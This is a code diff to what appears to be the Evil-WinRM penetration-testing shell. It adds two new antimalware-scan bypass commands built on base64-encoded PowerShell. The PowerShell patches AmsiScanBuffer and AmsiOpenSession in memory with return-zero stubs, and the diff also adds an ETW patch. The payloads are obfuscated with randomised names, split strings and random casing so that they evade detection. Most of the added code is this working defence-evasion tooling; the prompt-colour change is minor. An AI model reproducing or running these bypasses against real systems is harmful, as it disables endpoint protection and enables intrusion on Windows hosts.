@@ -23,7 +23,7 @@ require 'thread'
 # Constants
 
 # Version
-VERSION = '4.1'
+VERSION = '4.2'
 
 # Msg types
 TYPE_INFO = 0
@@ -35,7 +35,7 @@ TYPE_SUCCESS = 4
 # Global vars
 
 # Available commands
-$LIST = %w[Bypass-4MSI services upload download clear cls menu exit quit]
+$LIST = %w[Bypass-4MSI Bypass-4MSI-2 Bypass-4MSI-Legacy services upload download clear cls menu exit quit]
 $COMMANDS = $LIST.dup
 $CMDS = $COMMANDS.clone
 $LISTASSEM = [''].sort
@@ -488,6 +488,14 @@ class EvilWinRM
 
   # Define colors
   def colorize(text, color = 'default')
+    colors = { 'default' => '38', 'blue' => '34', 'red' => '31', 'yellow' => '1;33', 'magenta' => '35',
+               'green' => '1;32' }
+    color_code = colors[color]
+    "\033[0;#{color_code}m#{text}\033[0m"
+  end
+
+  # Readline-safe variant (brackets prevent line-wrap issues in prompt)
+  def colorize_prompt(text, color = 'default')
     colors = { 'default' => '38', 'blue' => '34', 'red' => '31', 'yellow' => '1;33', 'magenta' => '35',
                'green' => '1;32' }
     color_code = colors[color]
@@ -1306,7 +1314,7 @@ class EvilWinRM
             end
 
             if $colors_enabled
-              command = Readline.readline( "#{colorize('*Evil-WinRM*', 'red')}#{colorize(' PS ', 'yellow')}#{pwd}> ", true)
+              command = Readline.readline( "#{colorize_prompt('*Evil-WinRM*', 'red')}#{colorize_prompt(' PS ', 'yellow')}#{pwd}> ", true)
             else
               command = Readline.readline("*Evil-WinRM* PS #{pwd}> ", true)
             end
@@ -1571,6 +1579,30 @@ class EvilWinRM
                 sleep(timeToWait)
               end
               unless @Bypass_4MSI_loaded
+                load_Bypass_4MSI_Ret0(shell)
+                load_ETW_patch(shell)
+                @Bypass_4MSI_loaded = true
+              end
+            elsif command == 'Bypass-4MSI-2'
+              command = ''
+              timeToWait = (time + 20) - Time.now.to_i
+              if timeToWait.positive?
+                print_message('AV could be still watching for suspicious activity. Waiting for patching...', TYPE_WARNING, true, $logger)
+                sleep(timeToWait)
+              end
+              unless @Bypass_4MSI_loaded
+                load_Bypass_4MSI_Dual(shell)
+                load_ETW_patch(shell)
+                @Bypass_4MSI_loaded = true
+              end
+            elsif command == 'Bypass-4MSI-Legacy'
+              command = ''
+              timeToWait = (time + 20) - Time.now.to_i
+              if timeToWait.positive?
+                print_message('AV could be still watching for suspicious activity. Waiting for patching...', TYPE_WARNING, true, $logger)
+                sleep(timeToWait)
+              end
+              unless @Bypass_4MSI_loaded
                 load_Bypass_4MSI(shell)
                 load_ETW_patch(shell)
                 @Bypass_4MSI_loaded = true
@@ -1805,10 +1837,73 @@ class EvilWinRM
       result = replace_func_var_name(result, "VAR#{i}", var_name)
     end
 
+  result = replace_with_string_scan(result)
+  result = rand_casing_keywords(result)
+  result
+end
+
+def get_Bypass_4MSI_Ret0
+  bypass_template = 'ZnVuY3Rpb24gPj48RlVOQ1RJT04xPj48IHsKICAgIFBhcmFtICg+PjxWQVIxPj48LCA+PjxWQVIyPj48KQogICAgPj48VkFSMz4+PCA9IChbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbi5HZXRBc3NlbWJsaWVzKCkgfAogICAgV2hlcmUtT2JqZWN0IHsKICAgICAgICAkXy5HbG9iYWxBc3NlbWJseUNhY2hlIC1BbmQgJF8uTG9jYXRpb24uU3BsaXQoIiIrPD48XDw+PCs+PjxWQVI0Pj48KyIiKVstMV0uRXF1YWxzKCIiKzw+PFN5c3RlbS5kbGw8PjwrIiIpCiAgICB9KS5HZXRUeXBlKCIiKzw+PE1pY3Jvc29mdC5XaW4zMi5VbnNhZmVOYXRpdmVNZXRob2RzPD48KyIiKQogICAgPj48VkFSNT4+PD1AKCkKICAgID4+PFZBUjM+PjwuR2V0TWV0aG9kcygpIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgIElmKCRfLk5hbWUgLWxpa2UgKCIiKzw+PEdldCpQKm9jKmRkcmVzKjw+PCsiIikpIHsKICAgICAgICAgICAgPj48VkFSNT4+PCs9JF8KICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gPj48VkFSNT4+PFswXS5JbnZva2UoJG51bGwsIEAoKD4+PFZBUjM+PjwuR2V0TWV0aG9kKCIiKzw+PEdldE1vZHVsZUhhbmRsZTw+PCsiIikpLkludm9rZSgkbnVsbCwgQCg+PjxWQVIxPj48KSksID4+PFZBUjI+PjwpKQp9CiNqdW1wCmZ1bmN0aW9uID4+PEZVTkNUSU9OMj4+PCB7CiAgICBQYXJhbSAoCiAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlKV0gW1R5cGVbXV0gPj48VkFSNj4+PCwgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEpXSBbVHlwZV0gPj48VkFSNz4+PCA9IFtWb2lkXQogICAgKQogICAgPj48VkFSOD4+PCA9IFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkRlZmluZUR5bmFtaWNBc3NlbWJseSgKICAgICAgICAoTmV3LU9iamVjdCBTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseU5hbWUoIiIrPD48UmVmbGVjdGVkRGVsZWdhdGU8PjwrIiIpKSwKICAgICAgICBbU3lzdGVtLlJlZmxlY3Rpb24uRW1pdC5Bc3NlbWJseUJ1aWxkZXJBY2Nlc3NdOjpSdW4KICAgICkuRGVmaW5lRHluYW1pY01vZHVsZSgKICAgICAgICAiIis8PjxJbk1lbW9yeU1vZHVsZTw+PCsiIiwKICAgICAgICAkZmFsc2UKICAgKS5EZWZpbmVUeXBlKAogICAgICAgICIiKzw+PE15RGVsZWdhdGVUeXBlPD48KyIiLAogICAgICAgICJDbGFzcywgUHVibGljLCBTZWFsZWQsIEFuc2lDbGFzcywgQXV0b0NsYXNzIiwKICAgICAgICBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXQogICAgKQoKICAgID4+PFZBUjg+PjwuRGVmaW5lQ29uc3RydWN0b3IoCiAgICAgICAgIlJUU3BlY2lhbE5hbWUsIEhpZGVCeVNpZywgUHVibGljIiwKICAgICAgICBbU3lzdGVtLlJlZmxlY3Rpb24uQ2FsbGluZ0NvbnZlbnRpb25zXTo6U3RhbmRhcmQsID4+PFZBUjY+PjwKICAgICkuU2V0SW1wbGVtZW50YXRpb25GbGFncygiUnVudGltZSwgTWFuYWdlZCIpCgogICAgPj48VkFSOD4+PC5EZWZpbmVNZXRob2QoCiAgICAgICAgIkludm9rZSIsCiAgICAgICAgIlB1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsIiwKICAgICAgICA+PjxWQVI3Pj48LAogICAgICAgID4+PFZBUjY+PjwKICAgICkuU2V0SW1wbGVtZW50YXRpb25GbGFncygiUnVudGltZSwgTWFuYWdlZCIpCgogICAgcmV0dXJuID4+PFZBUjg+PjwuQ3JlYXRlVHlwZSgpCn0KI2p1bXAKW0ludFB0cl0+PjxWQVI5Pj48ID0gPj48RlVOQ1RJT04xPj48ICgiIis8PjxhbXNpLmRsbDw+PCsiIikgKCIiKzw+PEFtc2lTY2FuQnVmZmVyPD48KyIiKQojanVtcAo+PjxWQVIxMD4+PCA9IDAKI2p1bXAKPj48VkFSMTE+Pjw9W1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoCiAgICAoPj48RlVOQ1RJT04xPj48ICgiIis8PjxrZXJuZWwzMi5kbGw8PjwrIiIpICgiIis8PjxWaXJ0dWFsUHJvdGVjdDw+PCsiIikpLAogICAgKD4+PEZVTkNUSU9OMj4+PCBAKFtJbnRQdHJdLCBbVUludDMyXSwgW1VJbnQzMl0sIFtVSW50MzJdLk1ha2VCeVJlZlR5cGUoKSkgKFtCb29sXSkpCikKI2p1bXAKPj48VkFSMTI+PjwgPSA+PjxWQVIxMT4+PC5JbnZva2UoPj48VkFSOT4+PCwgNSwgMHg0MCwgW3JlZl0+PjxWQVIxMD4+PCkKI2p1bXAKPj48VkFSMTM+PjwgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5BcnJheUxpc3QKW3ZvaWRdPj48VkFSMTM+PjwuQWRkUmFuZ2UoQCgoMHgzMy0weDAyKSwoMHhDMC0weDAwKSwoMHgzMy0weDAwKSwoMHhEMi0weDAwKSwoMHhDMy0weDAwKSkpCiNqdW1wCltTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoW2J5dGVbXV0+PjxWQVIxMz4+PC5Ub0FycmF5KCksIDAsID4+PFZBUjk+PjwsID4+PFZBUjEzPj48LkNvdW50KQojanVtcApSZW1vdmUtSXRlbSBGdW5jdGlvbjo+PjxGVU5DVElPTjI+PjwKI2p1bXAKUmVtb3ZlLUl0ZW0gRnVuY3Rpb246Pj48RlVOQ1RJT04xPj48Cg=='
+
+  result = Base64.decode64(bypass_template)
+
+  for i in 1..2
+    func_name = "Get-#{random_string((7..17).to_a.sample)}"
+    result = replace_func_var_name(result, "FUNCTION#{i}", func_name)
+  end
+
+  for i in 1..13
+    var_name = "$#{random_string((7..17).to_a.sample)}"
+    result = replace_func_var_name(result, "VAR#{i}", var_name)
+  end
+
+  result = replace_with_string_scan(result)
+  result = rand_casing_keywords(result)
+  result
+end
+
+def get_Bypass_4MSI_Dual
+    bypass_template = 'ZnVuY3Rpb24gPj48RlVOQ1RJT04xPj48IHsKICAgIFBhcmFtICg+PjxWQVIxPj48LCA+PjxWQVIyPj48KQogICAgPj48VkFSMz4+PCA9IChbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbi5HZXRBc3NlbWJsaWVzKCkgfAogICAgV2hlcmUtT2JqZWN0IHsKICAgICAgICAkXy5HbG9iYWxBc3NlbWJseUNhY2hlIC1BbmQgJF8uTG9jYXRpb24uU3BsaXQoIiIrPD48XDw+PCs+PjxWQVI0Pj48KyIiKVstMV0uRXF1YWxzKCIiKzw+PFN5c3RlbS5kbGw8PjwrIiIpCiAgICB9KS5HZXRUeXBlKCIiKzw+PE1pY3Jvc29mdC5XaW4zMi5VbnNhZmVOYXRpdmVNZXRob2RzPD48KyIiKQogICAgPj48VkFSNT4+PD1AKCkKICAgID4+PFZBUjM+PjwuR2V0TWV0aG9kcygpIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgIElmKCRfLk5hbWUgLWxpa2UgKCIiKzw+PEdldCpQKm9jKmRkcmVzKjw+PCsiIikpIHsKICAgICAgICAgICAgPj48VkFSNT4+PCs9JF8KICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gPj48VkFSNT4+PFswXS5JbnZva2UoJG51bGwsIEAoKD4+PFZBUjM+PjwuR2V0TWV0aG9kKCIiKzw+PEdldE1vZHVsZUhhbmRsZTw+PCsiIikpLkludm9rZSgkbnVsbCwgQCg+PjxWQVIxPj48KSksID4+PFZBUjI+PjwpKQp9CiNqdW1wCmZ1bmN0aW9uID4+PEZVTkNUSU9OMj4+PCB7CiAgICBQYXJhbSAoCiAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlKV0gW1R5cGVbXV0gPj48VkFSNj4+PCwgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEpXSBbVHlwZV0gPj48VkFSNz4+PCA9IFtWb2lkXQogICAgKQogICAgPj48VkFSOD4+PCA9IFtBcHBEb21haW5dOjpDdXJyZW50RG9tYWluLkRlZmluZUR5bmFtaWNBc3NlbWJseSgKICAgICAgICAoTmV3LU9iamVjdCBTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseU5hbWUoIiIrPD48UmVmbGVjdGVkRGVsZWdhdGU8PjwrIiIpKSwKICAgICAgICBbU3lzdGVtLlJlZmxlY3Rpb24uRW1pdC5Bc3NlbWJseUJ1aWxkZXJBY2Nlc3NdOjpSdW4KICAgICkuRGVmaW5lRHluYW1pY01vZHVsZSgKICAgICAgICAiIis8PjxJbk1lbW9yeU1vZHVsZTw+PCsiIiwKICAgICAgICAkZmFsc2UKICAgKS5EZWZpbmVUeXBlKAogICAgICAgICIiKzw+PE15RGVsZWdhdGVUeXBlPD48KyIiLAogICAgICAgICJDbGFzcywgUHVibGljLCBTZWFsZWQsIEFuc2lDbGFzcywgQXV0b0NsYXNzIiwKICAgICAgICBbU3lzdGVtLk11bHRpY2FzdERlbGVnYXRlXQogICAgKQoKICAgID4+PFZBUjg+PjwuRGVmaW5lQ29uc3RydWN0b3IoCiAgICAgICAgIlJUU3BlY2lhbE5hbWUsIEhpZGVCeVNpZywgUHVibGljIiwKICAgICAgICBbU3lzdGVtLlJlZmxlY3Rpb24uQ2FsbGluZ0NvbnZlbnRpb25zXTo6U3RhbmRhcmQsID4+PFZBUjY+PjwKICAgICkuU2V0SW1wbGVtZW50YXRpb25GbGFncygiUnVudGltZSwgTWFuYWdlZCIpCgogICAgPj48VkFSOD4+PC5EZWZpbmVNZXRob2QoCiAgICAgICAgIkludm9rZSIsCiAgICAgICAgIlB1YmxpYywgSGlkZUJ5U2lnLCBOZXdTbG90LCBWaXJ0dWFsIiwKICAgICAgICA+PjxWQVI3Pj48LAogICAgICAgID4+PFZBUjY+PjwKICAgICkuU2V0SW1wbGVtZW50YXRpb25GbGFncygiUnVudGltZSwgTWFuYWdlZCIpCgogICAgcmV0dXJuID4+PFZBUjg+PjwuQ3JlYXRlVHlwZSgpCn0KI2p1bXAKPj48VkFSOT4+PD1bU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigoPj48RlVOQ1RJT04xPj48ICgiIis8PjxrZXJuZWwzMi5kbGw8PjwrIiIpICgiIis8PjxWaXJ0dWFsUHJvdGVjdDw+PCsiIikpLCAoPj48RlVOQ1RJT04yPj48IEAoW0ludFB0cl0sIFtVSW50MzJdLCBbVUludDMyXSwgW1VJbnQzMl0uTWFrZUJ5UmVmVHlwZSgpKSAoW0Jvb2xdKSkpCiNqdW1wCj4+PFZBUjEwPj48ID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0Clt2b2lkXT4+PFZBUjEwPj48LkFkZFJhbmdlKEAoKDB4MzMtMHgwMiksKDB4QzAtMHgwMCksKDB4QzMtMHgwMCkpKQojanVtcApbSW50UHRyXT4+PFZBUjExPj48ID0gPj48RlVOQ1RJT04xPj48ICgiIis8PjxhbXNpLmRsbDw+PCsiIikgKCIiKzw+PEFtc2lPcGVuU2Vzc2lvbjw+PCsiIikKPj48VkFSMTI+PjwgPSAwCj4+PFZBUjk+PjwuSW52b2tlKD4+PFZBUjExPj48LCAzLCAweDQwLCBbcmVmXT4+PFZBUjEyPj48KSB8IE91dC1OdWxsCltTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoW2J5dGVbXV0+PjxWQVIxMD4+PC5Ub0FycmF5KCksIDAsID4+PFZBUjExPj48LCA+PjxWQVIxMD4+PC5Db3VudCkKI2p1bXAKW0ludFB0cl0+PjxWQVIxMz4+PCA9ID4+PEZVTkNUSU9OMT4+PCAoIiIrPD48YW1zaS5kbGw8PjwrIiIpICgiIis8PjxBbXNpU2NhbkJ1ZmZlcjw+PCsiIikKPj48VkFSMTQ+PjwgPSAwCj4+PFZBUjk+PjwuSW52b2tlKD4+PFZBUjEzPj48LCAzLCAweDQwLCBbcmVmXT4+PFZBUjE0Pj48KSB8IE91dC1OdWxsCltTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoW2J5dGVbXV0+PjxWQVIxMD4+PC5Ub0FycmF5KCksIDAsID4+PFZBUjEzPj48LCA+PjxWQVIxMD4+PC5Db3VudCkKI2p1bXAKUmVtb3ZlLUl0ZW0gRnVuY3Rpb246Pj48RlVOQ1RJT04yPj48CiNqdW1wClJlbW92ZS1JdGVtIEZ1bmN0aW9uOj4+PEZVTkNUSU9OMT4+PAo='
+
+    result = Base64.decode64(bypass_template)
+
+    for i in 1..2
+      func_name = "Get-#{random_string((7..17).to_a.sample)}"
+      result = replace_func_var_name(result, "FUNCTION#{i}", func_name)
+    end
+
+    for i in 1..14
+      var_name = "$#{random_string((7..17).to_a.sample)}"
+      result = replace_func_var_name(result, "VAR#{i}", var_name)
+    end
+
     result = replace_with_string_scan(result)
     result = rand_casing_keywords(result)
     result
   end
+
+def load_Bypass_4MSI_Dual(shell)
+    bypass = get_Bypass_4MSI_Dual
+    print_message('Patching 4MSI (Dual-function ret-0: AmsiOpenSession + AmsiScanBuffer), please be patient...', TYPE_INFO, true)
+    outputs = load_powershell(shell, bypass, 2)
+    if outputs.empty?
+      print_message('[+] Success!', TYPE_SUCCESS, false)
+    else
+      puts(outputs.join("\n"))
+    end
+  end
+
+def load_Bypass_4MSI_Ret0(shell)
+
+  bypass = get_Bypass_4MSI_Ret0
+  print_message('Patching 4MSI (Return-0 stub), please be patient...', TYPE_INFO, true)
+  outputs = load_powershell(shell, bypass, 2)
+  if outputs.empty?
+    print_message('[+] Success!', TYPE_SUCCESS, false)
+  else
+    puts(outputs.join("\n"))
+  end
+end
 
   def wait_for(time_to_wait)
     thread = Thread.new do
